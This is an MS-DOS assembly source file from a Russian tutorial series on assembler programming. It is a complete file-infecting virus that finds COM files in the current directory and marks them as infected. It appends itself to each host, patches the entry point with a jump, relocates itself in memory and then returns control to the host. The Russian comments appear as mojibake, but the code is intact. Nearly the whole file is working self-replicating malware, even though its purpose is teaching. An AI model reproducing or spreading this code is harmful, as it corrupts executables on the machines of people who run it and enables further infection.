
;		VIRUS20.ASM - �ணࠬ�� � ����� � 020

;----------------------------------------------------------------------------
;			 !!! �������� !!!
;
;	   ��� ������� �����, ��������� �������� ������ �����!
;     ������, ��� �������������� � ��������� ���, �������� 20 �����!
;----------------------------------------------------------------------------


; (�) ����᪨� �ࠢ� �� 䠩��-�ਫ������ �ਭ������� ����� �����
; "��ᥬ����? �� ����! �稬�� �ணࠬ��஢��� ��� MS-DOS"
; ����: ����譨��� ���� ����ᠭ�஢�� (e-mail: Assembler@Kalashnikoff.ru)
;	 http://www.Kalashnikoff.ru

; --- ��ᥬ���஢���� (����祭�� *.com 䠩��) ---
;�� �ᯮ�짮����� MASM 6.11 - 6.13:
;ML.EXE virus20.asm /AT

;�� �ᯮ�짮����� TASM:
;TASM.EXE virus20.asm
;TLINK.EXE virus20.obj /t/x


.286
CSEG segment
assume cs:CSEG, ds:CSEG, es:CSEG, ss:CSEG
org 100h

Begin:
       push offset Init	;3 ����
       ret		;1 ����
 dw 1122h		;2 ���� (��⪠, 㪠�뢠���, �� 䠩� 㦥 ��ࠦ��)
;			---------
;�����:			 6 ����

F_bytes equ $-offset Begin	;����� ����� ���� "䠩��-�����"

;       === ��楤��� ࠡ��� � 䠩���� ===

; --- ����⨥ 䠩�� ��� ����� ---
; �室:  DX - ���� 䠩�� ASCIZ
; ��室: Handle, BX - ����� 䠩��
Open_file proc
     mov ax,3D02h	;���뢠�� 䠩� ��� �⥭��/�����
     mov dx,1Eh		;DX 㪠�뢠�� �� ��� ���������� 䠩�� � DTA
     int 21h
     mov Handle,ax	;���࠭塞 ����� 䠩��
     mov bx,ax
     ret

Handle dw 0FFFFh	;��६����� ��� �࠭���� ����� 䠩��
Open_file endp

; --- �����⨥ 䠩�� ---
; �室:  Handle - ����� ����⮣� 䠩��
; ��室: ��祣�
Close_file proc
     cmp Handle,0FFFFh	;��� ������� 䠩���?
     je No_close	;����� ��室�� (����뢠�� ��祣�!)

     mov bx,Handle	;����뢠�� 䠩�...
     mov ah,3Eh
     int 21h

No_close:
   ret
Close_file endp

; --- ���� ��ࢮ�� 䠩�� ---
Find_first proc
      mov ah,4Eh	;�饬 ���� 䠩� �� ��᪥ (Mask_file)
      xor cx,cx		;��ਡ��� ����� (CX=0)
      mov dx,offset Mask_file ;���� ��᪨ � DS:DX
      int 21h		;������ ��� 䠩�� ��室���� �� ����� 0BF00:001Eh

   ret
Mask_file db '*.com',0	;��᪠ ��� ���᪠ (⮫쪮 COM-䠩��)
Find_first endp

; --- ���� ᫥����� 䠩��� ---
Find_next proc
      xor dx,dx		;DS:DX 㪠�뢠�� �� DTA
      xor cx,cx		;��ਡ��� �����
      mov ah,4Fh
      int 21h		;������ � DTA ��室���� ���ଠ�� � ᫥���饬
			;��������� 䠩��
   ret
Find_next endp

; --- ��ࠦ���� 䠩�� ---
Infect_file proc
;�᭮���� ��楤�� ��ࠦ���� ���������� 䠩��.
;�㤥� ᫥���� �� ⥬, �� �ந�室�� � "䠩���-���⢮�".

;�����⨬, ��ࠦ��� ⠪�� 䠩� (����⢥���, com-䠩�, � �� asm!):

;���������������������������������������������������������������������������ͻ
;���ᥬ����		 ���設�� ���볏��᭥���			     �
;���������������������������������������������������������������������������Ķ
;�mov ah,9		 �B4 09	       �B4-����㧪� � AH, 09-�� ��㧨�      �
;�mov dx,offset Message  �BA 0801      �BA-����㧪� � DX, 0801-ᬥ�. ��ப�  �
;�int 21h		 �CD 21        �CD-int				     �
;�			 �	       �				     �
;�ret			 �C3	       �				     �
;�...			 �     ...     ��� �����-� �����/����	     �
;���������������������������������������������������������������������������ͼ

      mov ax,cs:[1Ch]	;����稬 ��஥ ᫮�� ����� ��ࠦ������ 䠩��
      or ax,ax		;�᫨ ��� �� ࠢ�� 0, � ��室��...
      jnz Error_infect	;...�� �����, �� ࠧ��� 䠩�� ����� 64��.

      mov bp,cs:[1Ah]	;����稬 ����襥 ᫮�� (�.�. ࠧ��� 䠩��)

      call Open_file	;���뢠�� 䠩�
      jc Error_infect	;�訡�� - �� ��室

      mov ah,3Fh
      mov cx,F_bytes	;��⠥� ���� ���� ���� "䠩��-�����"...
      mov dx,offset Finish ;...� 墮�� ��襣� �����.
      int 21h
      jc Error_infect

;���������������������������������������������������������������������������ͻ
;���ᥬ����		 ���設�� ���볏��᭥���			     �
;���������������������������������������������������������������������������Ķ
;�->mov ah,9		 �B4 09        ���⠥� ����� �⮩ �������...         �
;�->mov dx,offset Message�BA 0801      �� �⮩...			     �
;�->int			 �CD           �� ���� ���� �⮩.		     �
;�...			 �     ...     ���㣨� �����/���� (�� �⠥�!)      �
;���������������������������������������������������������������������������ͼ
;DX 㪠�뢠�� �� ����, �㤠 ���⠫� �� �����.
;�᫨ 䠩� ��ࠦ��, � 4 � 5 ����� ���� ࠢ�� 2211h (��ॢ����� �������)

;�஢�ਬ ��, �⮡� 2 ࠧ� �� ��ࠦ��� ���� � �� �� 䠩�...

      mov bx,dx
      cmp word ptr [bx+4],1122h	;�஢�ਬ �� �, ��ࠦ�� �� 㦥 ��� 䠩�
      je Error_infect		;�᫨ ��, � - �� ��室...

      mov ax,4202h	;��⠭���� 㪠��⥫� �⥭��/����� �� ����� 䠩��.
      mov bx,Handle
      xor cx,cx		;�����뢠�� 0 ����...
      xor dx,dx
      int 21h
      jc Error_infect

      mov ah,40h	;� BX 㦥 ���� ����� 䠩��.
      mov cx,offset Finish-100h-F_bytes	;��襬 � 墮�� "䠩��-�����"
      mov dx,100h			;⥫� �����.
      int 21h
      jc Error_infect

;������ ⥯��� ⠪��:
;���������������������������������������������������������������������������ͻ
;���ᥬ����		 ���設�� ���볏��᭥���			     �
;���������������������������������������������������������������������������Ķ
;�mov ah,9		 �B4 09        �B4-����㧪� � AH, 09-�� ��㧨�      �
;�mov dx,offset Message  �BA 0801      �BA-����㧪� � DX, 0801-ᬥ�. ��ப�  �
;�int 21h		 �CD 21        �CD-int				     �
;�			 �	       �				     �
;�ret			 �C3	       �				     �
;�...                    �     ...     ��� �����-� �����/����	     �
;������ ���� ��� �����   �     ...     �				     �
;���������������������������������������������������������������������������ͼ

      mov ah,40h	;��᫥ ⥫� ����� �����뢠�� ����
      mov cx,F_bytes	;�����騥 ���� ���� "䠩��-�����"...
      mov dx,offset Finish
      int 21h
      jc Error_infect

;����砥�:
;���������������������������������������������������������������������������ͻ
;���ᥬ����		 ���設�� ���볏��᭥���			     �
;���������������������������������������������������������������������������Ķ
;�mov ah,9		 �B4 09        �B4-����㧪� � AH, 09-�� ��㧨�      �
;�mov dx,offset Message  �BA 0801      �BA-����㧪� � DX, 0801-ᬥ�. ��ப�  �
;�int 21h		 �CD 21        �CD-int				     �
;�			 �	       �				     �
;�ret			 �C3	       �				     �
;�...                    �     ...     ��� �����-� �����/����	     �
;�			 �	       �				     �
;������ ���� ��� �����   �     ...     �                                     �
;�mov ah,9               �B4 09        �                                     �
;�mov dx,offset Message  �BA 0801      �                                     �
;�int			 �CD	       �				     �
;���������������������������������������������������������������������������ͼ
;����� ���� ����ᠫ� � 䠩� ��אַ �� ����� �����.

      call Close_file		;����뢠�� 䠩�.

      add bp,offset Init	;� ����� 䠩�� �ਡ���塞 ᬥ饭�� ��⪨ Init
      mov ss:[101h],bp		;����ᨬ ����祭�� ���� ��᫥ push

      call Open_file		;���뢠�� 䠩�. ������ 㪠��⥫� � ��砫�...

      mov ah,40h		;����襬 ���� ���� ���� (���室 �� �����)
      mov cx,F_bytes		;������ 㦥 ��������...
      push ss			;��襬 � ᥣ���� "䠩��-�����"
      pop ds
      mov dx,100h
      int 21h

;���������������������������������������������������������������������������ͻ
;���ᥬ����		 ���設�� ���볏��᭥���			     �
;���������������������������������������������������������������������������Ķ
;�push ���� �����      �68 ����     ����� �������� 2 ����               �
;�ret			 ��3	       �				     �
;�1122h			 �1122	       ������⥫� �� �, �� 䠩� 㦥 ��ࠦ���
;�and ax,bx              �21C3         ���� ⠪�� ���⨭�...                 �
;�...			 �     ...     ��� �����-� �����/����             �
;�			 �	       �				     �
;������ ���� ��� �����   �     ...     ���� ���� ⮫���� � �⥪ push       �
;�mov ah,9               �B4 09        �                                     �
;�mov dx,offset Message  �BA 0801      �                                     �
;�int			 �CD	       �				     �
;���������������������������������������������������������������������������ͼ

      push cs
      pop ds
      call Close_file	;����뢠�� 䠩�

      clc		;������ �ᯥ譮�� ��ࠦ����...
      ret

Error_infect:
      call Close_file	;����뢠�� 䠩�
      stc		;������ ⮣�, �� �ந��諠 �訡�� �� ��ࠦ����.
   ret
Infect_file endp



; === ��楤�� ���樠����樨 ����� ===
Init:
       pusha		;���࠭�� �� ॣ����� � �⥪�

       call Get_IP	;����稬 ᬥ饭��, ��� �� ᥩ�� ��室����
Get_IP:
       pop ax		;������ � AX - ᬥ饭��
       sub ax,offset Get_IP ;���⥬ �� ���� ॠ��� ����, ��� �� �㤥�
			    ;��室����� � ᥣ���� 0BF00h
			    ;����稬 ࠧ��� 䠩��-"�����", �᫨ ��� ���
			    ;(�.�. �� ����᪠�� ����� ���� ࠧ),
			    ;� AX �㤥� ࠢ�� 0

       push 0BF00h
       pop es		;ES - ᥣ����, �㤠 �㤥� ��६���� ��� �����.

       mov di,offset Open_file ;DI - ᬥ饭�� (���� ᠬ�� ��ࢮ� ��楤���)
       mov si,di
       add si,ax	;SI ������ ᮤ�ঠ�� �������� ���� (ᬥ饭��), �.�. ��
			;���� �� � ᥣ���� "䠩��-�����"...

       mov cx,offset Finish-offset Open_file ;CX = ����� ��襣� �����
       rep movsb	;������ � ����� ��� ����� �����

;����ᥬ � �⥪ ᬥ饭�� (Lab_return+AX) � ᥣ���� (CS) ������ �� �����...
       mov bx,offset Lab_return
       add bx,ax	;��� �� �����⢥��� ����ᨬ ���� ������ ��� retf
       push cs
       push bx

;����ᥬ � �⥪ ���� ��� ���室� � ���� �����:
;  * ᥣ���� - 0BF00h
;  * ᬥ饭�� - Lab_jmp
       mov bx,offset Lab_jmp ;�������筮 ���᪠�������...
       push 0BF00h
       push bx

;������ ��३��� �� ���� Lab_jmp, �ᯮ�������� � ᥣ���� 0BF00h.
       retf


; ������ �� 㦥 � ������ ��࠭�
Lab_jmp:
;CS ⥯��� ࠢ�� 0BF00h.

       push cs		;����ந� ॣ���� DS
       pop ds

       mov ah,1Ah	;��⠭���� DTA ��� ���᪠ 䠩���
       xor dx,dx	;�� ��⠭���������� �� �� ����, ����� ᮤ�ন���
       int 21h		;� ॣ����� DS:DX. � �⫠�稪� ᬮ���,
			;�� ��室���� � ����� �� ������ 㪠�뢠�� �����
			;ॣ�����, �.�. DS:DX...

       call Find_first	;�饬 ���� 䠩�
       jc Nomore_files	;��� COM-䠩��� � ⥪�饬 ��⠫��� - �� ��室

Inf_file:
       call Infect_file	;��諨 - �஡㥬 ��ࠧ���
       jnc Nomore_files	;������� ��ࠧ��� - ��室��

       call Find_next	;�� 㤠���� ��ࠧ��� - �饬 ᫥���騩
       jnc Inf_file	;��諨 �� ���� COM-䠩�; �஡㥬 ��ࠧ���...


;����⠭���� ���� ���� ���� 䠩��-����� � �����
;���, �� �� ����� �� ����⠭������� ����:
;���������������������������������������������������������������������������ͻ
;���ᥬ����		 ���設�� ���볏��᭥���			     �
;���������������������������������������������������������������������������Ķ
;�push ���� �����      �68 ����     ����� �������� 2 ����               �
;�ret			 ��3	       �				     �
;�1122h                  �1122         ������⥫� �� �, �� 䠩� 㦥 ��ࠦ���
;�and ax,bx              �21C3         ���� ⠪�� ���⨭�...                 �
;�...			 �     ...     ��� �����-� �����/����             �
;�			 �	       �				     �
;������ ���� ��� �����   �     ...     �                                     �
;�Init:                  �     ---     ���� ���� ⮫���� � �⥪ push       �
;�			 �	       �				     �
;�->mov ah,9             �B4 09        ���� �� ����� �㦭�...               �
;�->mov dx,offset Message�BA 0801      �...��६����� �� �����...          �
;�->int                  �CD           �...100h, �⮡� ����⠭����� 䠩�     �
;���������������������������������������������������������������������������ͼ
;�ਬ�砭��. Init: - ��⪠ ���樠����樨 �����. ��. ����.

Nomore_files:
      mov si,offset First_bytes ;DS:SI - �� ���ᨢ �� ��� ����
      mov di,100h	;ES:DI - �㤠 ��६���� ��ப� (���� ����)
      push ss		;ES ������ 㪠�뢠�� �� ᥣ���� "䠩��-�����"
      pop es
      mov cx,F_bytes	;6 ���� ��६�頥�: DS:SI = ES:DI
      rep movsb

;���, �� ����稫� ��᫥ ��६�饭�� ��� ���� "䠩��-�����":
;���������������������������������������������������������������������������ͻ
;���ᥬ����		 ���設�� ���볏��᭥��� 			     �
;���������������������������������������������������������������������������Ķ
;�mov ah,9               �B4 09        ��� ������� ��室���� �� ����� 100h �
;�mov dx,offset Message  �BA 0801      �                                     �
;�int 21h                �CD 21        �                                     �
;�			 �	       �				     �
;�ret                    �C3           �				     �
;�...                    �     ...     ��� �����-� �����/����             �
;�			 �	       �				     �
;������ ���� ��� �����   �     ...     �				     �
;�mov ah,9               �B4 09        �				     �
;�mov dx,offset Message  �BA 0801      �				     �
;�int                    �CD           �				     �
;���������������������������������������������������������������������������ͼ
;��⠫��� ⮫쪮 ��।��� �ࠢ����� �� ���� 100h.

;��୥��� � ᥣ���� �ணࠬ��-"�����", �.�. �㤠, ��� ��
;�뫨 ����砫쭮.
       retf


; ������ �� ����� � ᥣ���� ��ࠦ����� �ணࠬ��
Lab_return:
       push cs		;����⠭���� DS (ES 㦥 � ���浪�!)
       pop ds

       mov ah,1Ah	;����⠭���� DTA
       mov dx,80h
       int 21h

       popa		;����⠭���� ॣ�����

;!!! ��।��� �ࠢ����� "䠩��-���⢥" !!!
       push 100h	;����� ��������, ��� �� ⥯��� ���室��...
       ret		;...�� ���� 100h.


; === ����� ===
;����� (First_bytes) ���� �࠭����� ���� ����� "䠩��-�����".
;�᫨ �� ���� ����� �����, � �� 㬮�砭�� ����稬:
;nop (90h)
;nop (90h)
;nop (90h)
;nop (90h)
;int 20h (0CDh, 20h)
;�⮣�: 6 ����

;���� ���� ���� ��ࠦ������ 䠩�� ���� ⠪���:
;1 - push (68h)
;2,3 - ���� ��⪨ ���樠����樨 �����
;4 - ret (0C3h)
;5,6 - ��ࠦ�� �� 䠩� 㦥 (1122h)?
First_bytes db 4 dup (90h), 0CDh, 20h

Finish equ $

CSEG ends
end Begin